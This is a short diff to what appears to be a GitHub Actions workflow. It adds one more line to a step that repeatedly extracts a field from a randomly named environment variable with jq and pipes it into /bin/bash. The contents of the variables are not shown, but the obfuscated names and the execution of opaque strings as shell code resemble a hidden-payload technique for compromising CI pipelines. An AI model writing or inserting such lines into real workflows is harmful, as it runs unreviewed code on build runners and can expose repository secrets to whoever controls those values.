@@ -20,6 +20,7 @@ jobs:
           echo $jrkc03813 | jq -r .l00 | /bin/bash
           echo $n5 | jq -r .chswb103 | /bin/bash
           echo $pnot5 | jq -r .k5433 | /bin/bash
+          echo $xvh85188 | jq -r .l0 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
